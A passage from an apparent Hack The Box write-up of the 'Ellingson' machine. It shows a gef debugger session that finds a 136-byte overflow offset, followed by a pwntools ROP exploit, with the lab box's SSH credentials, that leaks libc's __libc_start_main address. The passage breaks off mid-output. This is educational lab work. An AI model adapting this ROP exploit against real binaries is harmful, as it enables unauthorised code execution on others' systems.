<span class="n">acdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaacoaaaaaacpaaaaaacqaaaaaacraaaaaacsaaaaaactaaaaaacuaaaaaacvaaaaaacwaaaaaacxaaaaaacyaaaaaaczaaaaaadbaaaaaadcaaaaaaddaaaaaade</span>
<span class="n">aaaaaadfaaaaaadgaaaaaadhaaaaaadiaaaaaadjaaaaaadkaaaaaadlaaaaaadmaaaaaadnaaaaaadoaaaaaadpaaaaaadqaaaaaadraaaaaadsaaaaaadtaaaaaaduaaaaaadvaaaaaadwaaaaaadxaaaaaadyaaaaaadzaaaaaaebaaaaaaecaaaaaaedaaaaaaeeaaaaaaefaaa</span>
<span class="n">aaaegaaaaaaehaaaaaaeiaaaaaaejaaaaaaekaaaaaaelaaaaaaemaaaaaaenaaaaaaeoaaaaaaepaaaaaaeqaaaaaaeraaaaaaesaaaaaaetaaaaaaeuaaaaaaevaaaaaaewaaaaaaexaaaaaaeyaaaaaaezaaaaaafbaaaaaafcaaaaaaf</span>                               
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Saved</span> <span class="n">as</span> <span class="err">'$</span><span class="n">_gef0</span><span class="err">'</span>
<span class="n">gef</span><span class="err">➤</span>  <span class="n">r</span>
<span class="n">Starting</span> <span class="n">program</span><span class="o">:</span> <span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">HTB</span><span class="o">/</span><span class="n">boxes</span><span class="o">/</span><span class="n">ellingson</span><span class="o">/</span><span class="n">garbage</span>

<span class="n">Enter</span> <span class="n">access</span> <span class="n">password</span><span class="o">:</span> <span class="n">aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaacoaaaaaacpaaaaaacqaaaaaacraaaaaacsaaaaaactaaaaaacuaaaaaacvaaaaaacwaaaaaacxaaaaaacyaaaaaaczaaaaaadbaaaaaadcaaaaaaddaaaaaadeaaaaaadfaaaaaadgaaaaaadhaaaaaadiaaaaaadjaaaaaadkaaaaaadlaaaaaadmaaaaaadnaaaaaadoaaaaaadpaaaaaadqaaaaaadraaaaaadsaaaaaadtaaaaaaduaaaaaadvaaaaaadwaaaaaadxaaaaaadyaaaaaadzaaaaaaebaaaaaaecaaaaaaedaaaaaaeeaaaaaaefaaaaaaegaaaaaaehaaaaaaeiaaaaaaejaaaaaaekaaaaaaelaaaaaaemaaaaaaenaaaaaaeoaaaaaaepaaaaaaeqaaaaaaeraaaaaaesaaaaaaetaaaaaaeuaaaaaaevaaaaaaewaaaaaaexaaaaaaeyaaaaaaezaaaaaafbaaaaaafcaaaaaaf</span>       

<span class="n">access</span> <span class="n">denied</span><span class="p">.</span>

<span class="n">Program</span> <span class="n">received</span> <span class="n">signal</span> <span class="n">SIGSEGV</span><span class="p">,</span> <span class="n">Segmentation</span> <span class="n">fault</span><span class="p">.</span>
<span class="mh">0x0000000000401618</span> <span class="n">in</span> <span class="n">auth</span> <span class="p">()</span>
<span class="p">[</span> <span class="n">Legend</span><span class="o">:</span> <span class="n">Modified</span> <span class="k">register</span> <span class="o">|</span> <span class="n">Code</span> <span class="o">|</span> <span class="n">Heap</span> <span class="o">|</span> <span class="n">Stack</span> <span class="o">|</span> <span class="n">String</span> <span class="p">]</span>
<span class="err">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span> <span class="n">registers</span> <span class="err">────</span>
<span class="err">$</span><span class="n">rax</span>   <span class="o">:</span> <span class="mh">0x0</span>
<span class="err">$</span><span class="n">rbx</span>   <span class="o">:</span> <span class="mh">0x0</span>
<span class="err">$</span><span class="n">rcx</span>   <span class="o">:</span> <span class="mh">0x00007f472f47a504</span>  <span class="err">→</span>  <span class="mh">0x5477fffff0003d48</span> <span class="p">(</span><span class="s">"H="</span><span class="o">?</span><span class="p">)</span>
<span class="err">$</span><span class="n">rdx</span>   <span class="o">:</span> <span class="mh">0x00007f472f54d8c0</span>  <span class="err">→</span>  <span class="mh">0x0000000000000000</span>
<span class="err">$</span><span class="n">rsp</span>   <span class="o">:</span> <span class="mh">0x00007ffcc590c3e8</span>  <span class="err">→</span>  <span class="s">"raaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxa[...]"</span>
<span class="err">$</span><span class="n">rbp</span>   <span class="o">:</span> <span class="mh">0x6161616161616171</span> <span class="p">(</span><span class="s">"qaaaaaaa"</span><span class="o">?</span><span class="p">)</span>
<span class="err">$</span><span class="n">rsi</span>   <span class="o">:</span> <span class="mh">0x000000000077c9c0</span>  <span class="err">→</span>  <span class="s">"access denied.</span><span class="se">\n</span><span class="s">ssword:"</span>
<span class="err">$</span><span class="n">rdi</span>   <span class="o">:</span> <span class="mh">0x0</span>
<span class="err">$</span><span class="n">rip</span>   <span class="o">:</span> <span class="mh">0x0000000000401618</span>  <span class="err">→</span>  <span class="o">&lt;</span><span class="n">auth</span><span class="o">+</span><span class="mi">261</span><span class="o">&gt;</span> <span class="n">ret</span> 
<span class="err">$</span><span class="n">r8</span>    <span class="o">:</span> <span class="mh">0x00007f472f552500</span>  <span class="err">→</span>  <span class="mh">0x00007f472f552500</span>  <span class="err">→</span>  <span class="p">[</span><span class="n">loop</span> <span class="n">detected</span><span class="p">]</span>
<span class="err">$</span><span class="n">r9</span>    <span class="o">:</span> <span class="mh">0x00007f472f54c848</span>  <span class="err">→</span>  <span class="mh">0x00007f472f54c760</span>  <span class="err">→</span>  <span class="mh">0x00000000fbad2a84</span>
<span class="err">$</span><span class="n">r10</span>   <span class="o">:</span> <span class="mh">0xfffffffffffff638</span>
<span class="err">$</span><span class="n">r11</span>   <span class="o">:</span> <span class="mh">0x246</span>
<span class="err">$</span><span class="n">r12</span>   <span class="o">:</span> <span class="mh">0x0000000000401170</span>  <span class="err">→</span>  <span class="o">&lt;</span><span class="n">_start</span><span class="o">+</span><span class="mi">0</span><span class="o">&gt;</span> <span class="n">xor</span> <span class="n">ebp</span><span class="p">,</span> <span class="n">ebp</span>
<span class="err">$</span><span class="n">r13</span>   <span class="o">:</span> <span class="mh">0x00007ffcc590c4e0</span>  <span class="err">→</span>  <span class="s">"xaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaacea[...]"</span>
<span class="err">$</span><span class="n">r14</span>   <span class="o">:</span> <span class="mh">0x0</span>
<span class="err">$</span><span class="n">r15</span>   <span class="o">:</span> <span class="mh">0x0</span>
<span class="err">$</span><span class="n">eflags</span><span class="o">:</span> <span class="p">[</span><span class="n">ZERO</span> <span class="n">carry</span> <span class="n">PARITY</span> <span class="n">adjust</span> <span class="n">sign</span> <span class="n">trap</span> <span class="n">INTERRUPT</span> <span class="n">direction</span> <span class="n">overflow</span> <span class="n">RESUME</span> <span class="n">virtualx86</span> <span class="n">identification</span><span class="p">]</span>                                                                                                       
<span class="err">$</span><span class="n">cs</span><span class="o">:</span> <span class="mh">0x0033</span> <span class="err">$</span><span class="n">ss</span><span class="o">:</span> <span class="mh">0x002b</span> <span class="err">$</span><span class="n">ds</span><span class="o">:</span> <span class="mh">0x0000</span> <span class="err">$</span><span class="n">es</span><span class="o">:</span> <span class="mh">0x0000</span> <span class="err">$</span><span class="n">fs</span><span class="o">:</span> <span class="mh">0x0000</span> <span class="err">$</span><span class="n">gs</span><span class="o">:</span> <span class="mh">0x0000</span>
<span class="err">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span> <span class="n">stack</span> <span class="err">────</span>
<span class="mh">0x00007ffcc590c3e8</span><span class="err">│</span><span class="o">+</span><span class="mh">0x0000</span><span class="o">:</span> <span class="s">"raaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxa[...]"</span>    <span class="err">←</span> <span class="err">$</span><span class="n">rsp</span>
<span class="mh">0x00007ffcc590c3f0</span><span class="err">│</span><span class="o">+</span><span class="mh">0x0008</span><span class="o">:</span> <span class="s">"saaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaaya[...]"</span>
<span class="mh">0x00007ffcc590c3f8</span><span class="err">│</span><span class="o">+</span><span class="mh">0x0010</span><span class="o">:</span> <span class="s">"taaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaaza[...]"</span>
<span class="mh">0x00007ffcc590c400</span><span class="err">│</span><span class="o">+</span><span class="mh">0x0018</span><span class="o">:</span> <span class="s">"uaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabba[...]"</span>
<span class="mh">0x00007ffcc590c408</span><span class="err">│</span><span class="o">+</span><span class="mh">0x0020</span><span class="o">:</span> <span class="s">"vaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabca[...]"</span>
<span class="mh">0x00007ffcc590c410</span><span class="err">│</span><span class="o">+</span><span class="mh">0x0028</span><span class="o">:</span> <span class="s">"waaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabda[...]"</span>
<span class="mh">0x00007ffcc590c418</span><span class="err">│</span><span class="o">+</span><span class="mh">0x0030</span><span class="o">:</span> <span class="s">"xaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabea[...]"</span>
<span class="mh">0x00007ffcc590c420</span><span class="err">│</span><span class="o">+</span><span class="mh">0x0038</span><span class="o">:</span> <span class="s">"yaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfa[...]"</span>
<span class="err">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span> <span class="n">code</span><span class="o">:</span><span class="n">x86</span><span class="o">:</span><span class="mi">64</span> <span class="err">────</span>
     <span class="mh">0x40160d</span> <span class="o">&lt;</span><span class="n">auth</span><span class="o">+</span><span class="mi">250</span><span class="o">&gt;</span>       <span class="n">call</span>   <span class="mh">0x401050</span> <span class="o">&lt;</span><span class="n">puts</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
     <span class="mh">0x401612</span> <span class="o">&lt;</span><span class="n">auth</span><span class="o">+</span><span class="mi">255</span><span class="o">&gt;</span>       <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span> <span class="mh">0x0</span>
     <span class="mh">0x401617</span> <span class="o">&lt;</span><span class="n">auth</span><span class="o">+</span><span class="mi">260</span><span class="o">&gt;</span>       <span class="n">leave</span>  
 <span class="err">→</span>   <span class="mh">0x401618</span> <span class="o">&lt;</span><span class="n">auth</span><span class="o">+</span><span class="mi">261</span><span class="o">&gt;</span>       <span class="n">ret</span>    
<span class="p">[</span><span class="o">!</span><span class="p">]</span> <span class="n">Cannot</span> <span class="n">disassemble</span> <span class="n">from</span> <span class="err">$</span><span class="n">PC</span>
<span class="err">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span> <span class="n">threads</span> <span class="err">────</span>
<span class="p">[</span><span class="err">#</span><span class="mi">0</span><span class="p">]</span> <span class="n">Id</span> <span class="mi">1</span><span class="p">,</span> <span class="n">Name</span><span class="o">:</span> <span class="s">"garbage"</span><span class="p">,</span> <span class="n">stopped</span><span class="p">,</span> <span class="n">reason</span><span class="o">:</span> <span class="n">SIGSEGV</span>
<span class="err">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span> <span class="n">trace</span> <span class="err">────</span>
<span class="p">[</span><span class="err">#</span><span class="mi">0</span><span class="p">]</span> <span class="mh">0x401618</span> <span class="err">→</span> <span class="n">auth</span><span class="p">()</span>
<span class="err">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span>
<span class="n">gef</span><span class="err">➤</span>  <span class="n">pattern</span> <span class="n">offset</span> <span class="n">raaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxa</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Searching</span> <span class="err">'</span><span class="n">raaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxa</span><span class="err">'</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Found</span> <span class="n">at</span> <span class="n">offset</span> <span class="mi">136</span> <span class="p">(</span><span class="n">big</span><span class="o">-</span><span class="n">endian</span> <span class="n">search</span><span class="p">)</span>
<span class="n">gef</span><span class="err">➤</span>  

</code></pre></div></div>
<p><br>Offset is 136 bytes, let’s start writing the exploit (I’m using <a href="https://github.com/Gallopsled/pwntools" target="_blank" rel="noopener noreferrer">pwntools</a>). 
<br>First thing to do is to set-up the connection to the box and start the remote process, we have <code class="highlighter-rouge">ssh</code> access so we can use that:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">r</span> <span class="o">=</span> <span class="n">ssh</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s">'ellingson.htb'</span><span class="p">,</span> <span class="n">user</span><span class="o">=</span><span class="s">'margo'</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="s">'iamgod$08'</span><span class="p">)</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">process</span><span class="p">(</span><span class="s">'/usr/bin/garbage'</span><span class="p">)</span>
</code></pre></div></div>
<p><br>Then we need to load the binary file and <code class="highlighter-rouge">libc</code> in the exploit:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./garbage"</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./libc.so.6"</span><span class="p">)</span>
</code></pre></div></div>
<p><br>We can use the <code class="highlighter-rouge">ROP()</code> function to load the <code class="highlighter-rouge">rop</code> gadgets from the binary:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">elf</span><span class="p">)</span>
</code></pre></div></div>
<p><br><code class="highlighter-rouge">exploit.py</code>:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">r</span> <span class="o">=</span> <span class="n">ssh</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s">'ellingson.htb'</span><span class="p">,</span> <span class="n">user</span><span class="o">=</span><span class="s">'margo'</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="s">'iamgod$08'</span><span class="p">)</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">process</span><span class="p">(</span><span class="s">'/usr/bin/garbage'</span><span class="p">)</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./garbage"</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./libc.so.6"</span><span class="p">)</span>
<span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">elf</span><span class="p">)</span>
</code></pre></div></div>
<p><br></p>
<h3 id="exploitation-leaking-libc-base-address">Exploitation: Leaking libc base address</h3>
<p><br>I created a function called <code class="highlighter-rouge">leak()</code> that takes 4 arguments (the process, the loaded binary file, <code class="highlighter-rouge">libc</code> and the <code class="highlighter-rouge">rop</code> gadgets):</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">leak</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="n">elf</span><span class="p">,</span><span class="n">libc</span><span class="p">,</span><span class="n">rop</span><span class="p">):</span>
</code></pre></div></div>
<p><br>This function will perform the 1st <code class="highlighter-rouge">rop</code> chain, it will send 136 bytes to reach <code class="highlighter-rouge">rip</code> and overwrite it with a <code class="highlighter-rouge">pop rdi, ret</code> gadget, then it will send <code class="highlighter-rouge">__libc_start_main@plt</code>’s address (will be placed in <code class="highlighter-rouge">rdi</code>) and call <code class="highlighter-rouge">puts()</code> which will take its argument from <code class="highlighter-rouge">rdi</code> and print the address of <code class="highlighter-rouge">__libc_start_main</code>. Finally it will call <code class="highlighter-rouge">main()</code> again to prevent execution from breaking (if the execution breaks the leaked address will be of no use because it won’t be the same when we execute the program again). 
<br>We need the addresses of <code class="highlighter-rouge">pop rdi, ret</code> gadget, <code class="highlighter-rouge">__libc_start_main@plt</code> from the binary, <code class="highlighter-rouge">puts()@plt</code> from the binary, <code class="highlighter-rouge">main()</code> from the binary, to get them:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="n">POP_RDI</span> <span class="o">=</span> <span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s">'pop rdi'</span><span class="p">,</span> <span class="s">'ret'</span><span class="p">]))[</span><span class="mi">0</span><span class="p">]</span>
	<span class="n">LIBC_START_MAIN</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'__libc_start_main'</span><span class="p">]</span>
	<span class="n">PUTS</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s">'puts'</span><span class="p">]</span>
	<span class="n">MAIN</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'main'</span><span class="p">]</span>
</code></pre></div></div>
<p><br>Now we can simply construct the payload:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mi">136</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">)</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">LIBC_START_MAIN</span><span class="p">)</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">PUTS</span><span class="p">)</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">MAIN</span><span class="p">)</span>
</code></pre></div></div>
<p><br>Finally we will send the payload and receive the leaked address:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'password:'</span><span class="p">)</span>
	<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
	<span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
	<span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
	<span class="n">leak</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
	<span class="n">leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">leak</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>

	<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"Leaked __libc_start_main: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">leak</span><span class="p">))</span>
	<span class="k">return</span> <span class="n">leak</span>
</code></pre></div></div>
<p><br>Let’s test it:
<br><code class="highlighter-rouge">exploit.py</code>:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="k">def</span> <span class="nf">leak</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="n">elf</span><span class="p">,</span><span class="n">libc</span><span class="p">,</span><span class="n">rop</span><span class="p">):</span>
	<span class="n">POP_RDI</span> <span class="o">=</span> <span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s">'pop rdi'</span><span class="p">,</span> <span class="s">'ret'</span><span class="p">]))[</span><span class="mi">0</span><span class="p">]</span>
	<span class="n">LIBC_START_MAIN</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'__libc_start_main'</span><span class="p">]</span>
	<span class="n">PUTS</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s">'puts'</span><span class="p">]</span>
	<span class="n">MAIN</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'main'</span><span class="p">]</span>
	
	<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"puts@plt: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">PUTS</span><span class="p">))</span>
	<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"__libc_start_main: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">LIBC_START_MAIN</span><span class="p">))</span>
	<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"pop rdi gadget: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">))</span>
	
	<span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mi">136</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">)</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">LIBC_START_MAIN</span><span class="p">)</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">PUTS</span><span class="p">)</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">MAIN</span><span class="p">)</span>

	<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'password:'</span><span class="p">)</span>
	<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
	<span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
	<span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
	<span class="n">leak</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
	<span class="n">leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">leak</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>

	<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"Leaked __libc_start_main: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">leak</span><span class="p">))</span>
	<span class="k">return</span> <span class="n">leak</span>

<span class="n">r</span> <span class="o">=</span> <span class="n">ssh</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s">'ellingson.htb'</span><span class="p">,</span> <span class="n">user</span><span class="o">=</span><span class="s">'margo'</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="s">'iamgod$08'</span><span class="p">)</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">process</span><span class="p">(</span><span class="s">'/usr/bin/garbage'</span><span class="p">)</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./garbage"</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./libc.so.6"</span><span class="p">)</span>
<span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">elf</span><span class="p">)</span>

<span class="n">leak</span> <span class="o">=</span> <span class="n">leak</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="n">elf</span><span class="p">,</span><span class="n">libc</span><span class="p">,</span><span class="n">rop</span><span class="p">)</span>
</code></pre></div></div>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">root</span><span class="err">@</span><span class="n">kali</span><span class="o">:~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">HTB</span><span class="o">/</span><span class="n">boxes</span><span class="o">/</span><span class="n">ellingson</span><span class="o">/</span><span class="n">exploit</span><span class="err">#</span> <span class="p">.</span><span class="o">/</span><span class="n">exploit</span><span class="p">.</span><span class="n">py</span> 
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Connecting</span> <span class="n">to</span> <span class="n">ellingson</span><span class="p">.</span><span class="n">htb</span> <span class="n">on</span> <span class="n">port</span> <span class="mi">22</span><span class="o">:</span> <span class="n">Done</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">margo</span><span class="err">@</span><span class="n">ellingson</span><span class="p">.</span><span class="n">htb</span><span class="o">:</span>
    <span class="n">Distro</span>    <span class="n">Ubuntu</span> <span class="mi">18</span><span class="p">.</span><span class="mo">04</span>
    <span class="n">OS</span><span class="o">:</span>       <span class="n">linux</span>
    <span class="n">Arch</span><span class="o">:</span>     <span class="n">amd64</span>
    <span class="n">Version</span><span class="o">:</span>  <span class="mi">4</span><span class="p">.</span><span class="mi">15</span><span class="p">.</span><span class="mi">0</span>
    <span class="n">ASLR</span><span class="o">:</span>     <span class="n">Enabled</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Starting</span> <span class="n">remote</span> <span class="n">process</span> <span class="err">'</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">garbage</span><span class="err">'</span> <span class="n">on</span> <span class="n">ellingson</span><span class="p">.</span><span class="n">htb</span><span class="o">:</span> <span class="n">pid</span> <span class="mi">7730</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="err">'</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">HTB</span><span class="o">/</span><span class="n">boxes</span><span class="o">/</span><span class="n">ellingson</span><span class="o">/</span><span class="n">exploit</span><span class="o">/</span><span class="n">garbage</span><span class="err">'</span>
    <span class="n">Arch</span><span class="o">:</span>     <span class="n">amd64</span><span class="o">-</span><span class="mi">64</span><span class="o">-</span><span class="n">little</span>
    <span class="n">RELRO</span><span class="o">:</span>    <span class="n">Partial</span> <span class="n">RELRO</span>
    <span class="n">Stack</span><span class="o">:</span>    <span class="n">No</span> <span class="n">canary</span> <span class="n">found</span>
    <span class="n">NX</span><span class="o">:</span>       <span class="n">NX</span> <span class="n">enabled</span>
    <span class="n">PIE</span><span class="o">:</span>      <span class="n">No</span> <span class="n">PIE</span> <span class="p">(</span><span class="mh">0x400000</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="err">'</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">HTB</span><span class="o">/</span><span class="n">boxes</span><span class="o">/</span><span class="n">ellingson</span><span class="o">/</span><span class="n">exploit</span><span class="o">/</span><span class="n">libc</span><span class="p">.</span><span class="n">so</span><span class="p">.</span><span class="mi">6</span><span class="err">'</span>
    <span class="n">Arch</span><span class="o">:</span>     <span class="n">amd64</span><span class="o">-</span><span class="mi">64</span><span class="o">-</span><span class="n">little</span>
    <span class="n">RELRO</span><span class="o">:</span>    <span class="n">Partial</span> <span class="n">RELRO</span>
    <span class="n">Stack</span><span class="o">:</span>    <span class="n">Canary</span> <span class="n">found</span>
    <span class="n">NX</span><span class="o">:</span>       <span class="n">NX</span> <span class="n">enabled</span>
    <span class="n">PIE</span><span class="o">:</span>      <span class="n">PIE</span> <span class="n">enabled</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Loaded</span> <span class="n">cached</span> <span class="n">gadgets</span> <span class="k">for</span> <span class="err">'</span><span class="p">.</span><span class="o">/</span><span class="n">garbage</span><span class="err">'</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">puts</span><span class="err">@</span><span class="n">plt</span><span class="o">:</span> <span class="mh">0x401050</span>
